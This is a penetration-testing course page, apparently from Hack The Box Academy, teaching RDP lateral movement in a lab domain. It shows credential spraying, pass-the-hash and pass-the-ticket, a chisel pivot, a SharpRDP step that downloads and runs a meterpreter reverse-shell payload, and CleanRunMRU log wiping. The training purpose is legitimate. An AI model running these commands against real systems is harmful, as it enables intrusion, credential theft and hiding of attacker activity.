
<h1>Remote Desktop Service (RDP)</h1>
<p><code>Remote Desktop Protocol (RDP)</code> is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. RDP is widely used for remote administration, technical support, and accessing workstations and servers remotely. RDP supports a complete desktop experience, including remote sound, clipboard, printers, and file transfers with high-resolution graphics, which can be scaled down based on bandwidth. RDP by default uses TCP port <code>3389</code> for communication.</p>
<h2>RDP Rights</h2>
<p>The required rights to connect to RDP depend on the configuration; by default, only members of the <code>Administrators</code> or <code>Remote Desktop Users</code> groups can connect via RDP. Additionally, an administrator can grant specific users or groups rights to connect to RDP. Because those rights are set locally, the only way to enumerate them is if we have Administrative rights on the target computer.</p>
<h2>RDP Enumeration</h2>
<p>To use RDP for lateral movement we need to be aware if RDP is present on the enviroment we are testing, we can use <code>NMAP</code> or any other network enumeration tool to search for port 3389 and once we get a list of targets, we can use that list with tools such as <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> to test multiple credentials.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> RDP uses TCP port <code>3389</code> by default, but administrators can configure it in any other port.</p>
</div>
</div>
<p>To test credentials againts RDP we will use <code>netexec</code>. Let's select the protocol <code>rdp</code> and the account <code>Helen</code> and the password <code>RedRiot88</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local
RDP         10.129.229.242  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:DC01) (nla:True)
RDP         10.129.229.244  3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 17763 (name:SRV01) (domain:SRV01) (nla:True)
RDP         10.129.229.242  3389   DC01             [-] inlanefreight.local\helen:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
...SNIP...
</code></pre>
<p>We confirm Helen has RDP rights on SRV01. Remember that <code>(Pwn3d!)</code> doesn't mean we have administrative rights on the target machine but that we have rights to connect to RDP</p>
<h2>Lateral Movement From Windows</h2>
<p>To connect to RDP from Windows we can use the default windows <code>Remote Desktop Connection</code> client that can be accessed by running <code>mstsc</code> on Run, Cmd or PowerShell:</p>
<pre><code class="language-cmd-session">C:\Tools&gt; mstsc.exe
</code></pre>
<p>This will open a client where we can specify the target IP address or domain name, and once we click <code>Connect</code>, it will prompt us for the credentials:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/mstsc.png"/></p>
<p>Here are some actions that can be efficiently executed using RDP:</p>
<ul>
<li>
<p><code>File Transfer</code>: Transfer files between the local and remote computers by dragging and dropping files or using copy and paste.</p>
</li>
<li>
<p><code>Running Applications</code>: Run applications on the remote computer. This is useful for accessing software that is only installed on the remote machine.</p>
</li>
<li>
<p><code>Printing</code>: Print documents from the remote computer to a printer connected to the local computer.</p>
</li>
<li>
<p><code>Audio and Video Streaming</code>: Stream audio and video from the remote computer to the local machine, which is useful for multimedia applications.</p>
</li>
<li>
<p><code>Clipboard Sharing</code>: Share the clipboard between the local and remote computers, allowing you to copy and paste text and images across machines.</p>
</li>
</ul>
<h2>Lateral Movement From Linux</h2>
<p>To connect to RDP from Linux, we can use the <a href="https://github.com/FreeRDP/FreeRDP">xfreerdp</a> command-line tool. Here is an example of how to use it:</p>
<pre><code class="language-shell-session">[!bash!]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
</code></pre>
<p>In this command:</p>
<ul>
<li>
<code>/u:Helen</code> specifies the username.</li>
<li>
<code>/p:'RedRiot88'</code> specifies the password.</li>
<li>
<code>/d:inlanefreight.local</code> specifies the domain.</li>
<li>
<code>/v:10.129.229.244</code> specifies the IP address of the target Windows machine.</li>
<li>
<code>/dynamic-resolution</code> enables dynamic resolution adjustment which allow us to resize the windows dynamicaly.</li>
<li>
<code>/drive:.,linux</code> redirects the local filesystem to the remote session, making it accessible from the remote Windows machine.</li>
</ul>
<p>By running this command in the terminal, we can establish an RDP connection to the specified Windows machine and perform similar actions as we would using the Windows <code>Remote Desktop Connection</code> client.</p>
<h3>Optimizing xfreerdp for Low Latency Networks or Proxy Connections</h3>
<p>If you are using <code>xfreerdp</code> over a proxy or with slow network connectivity, we can improve the session speed by using the following additional options:</p>
<pre><code class="language-shell-session">[!bash!]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
</code></pre>
<p>In this command:</p>
<ul>
<li>
<code>/bpp:8</code>: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.</li>
<li>
<code>/compression</code>: Enables compression to reduce the amount of data sent over the network.</li>
<li>
<code>-themes</code>: Disables desktop themes to reduce graphical data.</li>
<li>
<code>-wallpaper</code>: Disables the desktop wallpaper to further reduce graphical data.</li>
<li>
<code>/clipboard</code>: Enables clipboard sharing between the local and remote machines.</li>
<li>
<code>/audio-mode:0</code>: Disables audio redirection to save bandwidth.</li>
<li>
<code>/auto-reconnect</code>: Automatically reconnects if the connection drops, improving session stability.</li>
<li>
<code>-glyph-cache</code>: Enables caching of glyphs (text characters) to reduce the amount of data sent for text rendering.</li>
</ul>
<p>Using these options helps to optimize the performance of the RDP session, ensuring a smoother experience even in less-than-ideal network conditions.</p>
<h2>Restricted Admin Mode</h2>
<p>Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.</p>
<p>Although this mode prevents the caching of credentials, if enabled, it allows the execution of <code>Pass the Hash</code> or <code>Pass the Ticket</code> for lateral movement.</p>
<p>To confirm if <code>Restricted Admin Mode</code> is enabled, we can query the following registry key:</p>
<pre><code class="language-cmd-session">C:\Tools&gt; reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
</code></pre>
<p>The value of <code>DisableRestrictedAdmin</code> indicates the status of <code>Restricted Admin Mode</code>:</p>
<ul>
<li>If the value is <code>0</code>, <code>Restricted Admin Mode</code> is enabled.</li>
<li>If the value is <code>1</code>, <code>Restricted Admin Mode</code> is disabled.</li>
</ul>
<p>If the key does not exist it means that is disabled and, we will see the following error message:</p>
<pre><code class="language-cmd-session">C:\Tools&gt; reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

ERROR: The system was unable to find the specified registry key or value.
</code></pre>
<p>Additionally, to enable <code>Restricted Admin Mode</code>, we would set the <code>DisableRestrictedAdmin</code> value to <code>0</code>. Here is the command to enable it:</p>
<pre><code class="language-cmd-session">C:\Tools&gt; reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
</code></pre>
<p>And to disable <code>Restricted Admin Mode</code>, set the <code>DisableRestrictedAdmin</code> value to <code>1</code>:</p>
<pre><code class="language-cmd-session">C:\Tools&gt; reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Only members of the Administrators group can abuse <code>Restricted Admin Mode</code>. </p>
</div>
</div>
<h2>Pivoting</h2>
<p>It is common that we will need to use pivoting to perform lateral movement, in the module <a href="https://academy.hackthebox.com/module/details/158">Pivoting, Tunneling and Port Forwarding</a> we explain everything we need to know about pivoting.</p>
<p>In this lab, we have access to one single host. To connect to the other machines from our Linux attack host, we will need to set up a pivot method; in this case, we will use <a href="https://github.com/jpillora/chisel">chisel</a>.</p>
<p>We will need to configure a <code>socks5</code> SOCKS proxy on port <code>1080</code> in the <code>/etc/proxychains.conf</code> file:</p>
<pre><code class="language-shell-session">[!bash!]$ cat /etc/proxychains.conf | grep -Ev '(^#|^$)' | grep socks
socks5 127.0.0.1 1080 
</code></pre>
<p>Next, on our Linux machine, we will initiate reverse port forwarding server:</p>
<pre><code class="language-shell-session">[!bash!]$ ./chisel server --reverse 
2024/03/28 07:09:08 server: Reverse tunnelling enabled
2024/03/28 07:09:08 server: Fingerprint AKOstLSoSTPQPp2PVEALM6z9Jx0IQVEEmO7bOSan1s4=
2024/03/28 07:09:08 server: Listening on http://0.0.0.0:8080
2024/03/28 07:10:49 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
</code></pre>
<p>Then, in <code>SRV01</code>, we will connect to the server with the following command <code>chisel.exe client &lt;VPN IP&gt; R:socks</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\chisel.exe client 10.10.14.207:8080 R:socks
2024/03/28 06:10:48 client: Connecting to ws://10.10.14.207:8080
2024/03/28 06:10:49 client: Connected (Latency 137.6381ms)
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Those steps are always required when we see the use of <code>proxychains</code> during the module. Alternatively, we can also use tools such as <a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a>, which is recommended if using PwnBox. </p>
</div>
</div>
<h2>Pass the Hash and Pass the Ticket for RDP</h2>
<p>Once we confirm <code>Restricted Admin Mode</code> is enabled, or if we can enable it, we can proceed to perform <code>Pass the Hash</code> or <code>Pass the Ticket</code> attacks with RDP.</p>
<p>To perform <code>Pass the Hash</code> from a Linux machine, we can use <code>xfreerdp</code> with the <code>/pth</code> option to use a hash and connect to RDP. Here's an example command:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
</code></pre>
<p>For <code>Pass the Ticket</code> we can use <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>. We will forge a ticket using <code>Helen</code>'s hash. First we need to launch a sacrificial process with the option <code>createnetonly</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\Rubeus.exe createnetonly /program:powershell.exe /show
</code></pre>
<p>In the new PowerShell window we will use Helen's hash to forge a Ticket-Granting ticket (TGT):</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 62EBA30320E250ECA185AA1327E78AEB
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\helen'
[*] Using domain controller: fe80::711d:1399:b85a:50c5%9:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFrjCCBaqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      ...SNIP...

[+] Ticket successfully imported!
...SNIP...
</code></pre>
<p>From the window where we imported the ticket, we can use the <code>mstsc /restrictedAdmin</code> command:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; mstsc.exe /restrictedAdmin
</code></pre>
<p>It will open a window as the currently logged-in user. It doesn't matter if the name is not the same as the account we are trying to impersonate.</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/mstsc-restrictedadmin.png"/></p>
<p>When we click login, it will allow us to connect to RDP using the hash:</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/263/mstsc-rdp-with-ticket.png"/></p>
<h2>SharpRDP</h2>
<p><a href="https://github.com/0xthirteen/SharpRDP">SharpRDP</a> is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the <code>mstscax.dll</code> library used by RDP clients. This tool can perform actions such as connecting, authenticating, executing commands, and disconnecting without needing a GUI client or SOCKS proxy.</p>
<p>SharpRDP relies on the terminal services library (<code>mstscax.dll</code>) and generates the required DLLs (<code>MSTSCLib.DLL</code> and <code>AxMSTSCLib.DLL</code>) from the <code>mstscax.dll</code>. It uses an invisible Windows form to handle the terminal services connection object instantiation and perform actions needed for lateral movement.</p>
<p>We will use Metasploit and PowerShell to execute commands on the target machine. In our Linux machine we will execute Metasploit to listen on port 8888:</p>
<pre><code class="language-shell-session">[!bash!]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
</code></pre>
<p>Then we will generate a payload with msfvenom using PowerShell Reflection:</p>
<pre><code class="language-shell-session">[!bash!]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 774 bytes
Final size of psh-reflection file: 3543 bytes
Saved as: s
</code></pre>
<p>Next we use python http server to host our payload:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>
<p>Now we can use <code>SharpRDP</code> to execute a powershell command to execute our payload and provide a session:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88
[+] Connected to          :  srv01
[+] Execution priv type   :  non-elevated
[+] Executing powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.207/s')
[+] Disconnecting from    :  srv01
[+] Connection closed     :  srv01
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> The execution of commands of <code>SharpRDP</code> is limited to 259 characters. </p>
</div>
</div>
<p><code>SharpRDP</code> uses Microsoft run to execute commands, we can use <a href="https://github.com/0xthirteen/CleanRunMRU">CleanRunMRU</a> to clean all command records. To compile the tool we can use the built-in Microsoft <a href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/">csc</a> compiler tool. Let's first transfer CleanRunMRU's <code>Program.cs</code> file from our attack host into the target computer:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
</code></pre>
<p>Now we can use <code>csc.exe</code> to compile it:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
</code></pre>
<p>Now we can use <code>CleanRunMRU.exe</code> to clear all commands:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\CleanRunMRU.exe  clearall
HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
[+] Cleaned all RunMRU values
</code></pre>
<h2>Advantages of RDP for Lateral Movement</h2>
<p>RDP provides several advantages for lateral movement, making it a preferred method for attackers in certain scenarios. Some of the key advantages include:</p>
<ul>
<li>
<code>Evade Detection</code>: RDP traffic is common in business environments, making it less likely to raise suspicion.</li>
<li>
<code>Non-Admin Access</code>: RDP access does not necessarily require administrative rights; a non-admin user can also have RDP access.</li>
<li>
<code>Persistent Access</code>: Once a foothold is established, RDP can provide persistent access to the network.</li>
</ul>
<h2>Conclusion</h2>
<p>RDP is a powerful tool for lateral movement, offering several advantages such as ease of use and evading detection. Understanding how to use and abuse RDP effectively can significantly enhance our lateral movement capabilities. In the next section, we will explore <code>SMB</code>, one of the most common and widely used methods for lateral movement.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-success '&gt;low Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="29" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="38" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2461 text-dark"></span> with user "<span class="text-success">helen</span>" and
                                password "<span class="text-danger">RedRiot88</span>" </p>
<label class="module-question" for="2461"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Confirm which user other than Helen is member of "Remote Desktop Users" group on SRV01.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2461" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2461">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2461" id="btnAnswer2461">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="2462"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Perform a Password Spray using Helen's credentials. Connect to the target machine using RDP with the account you found and read the flag located at C:\Flags\RDPflag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2462" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2462">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2462" id="btnAnswer2462">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint2462" data-toggle="modal" id="hintBtn2462"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
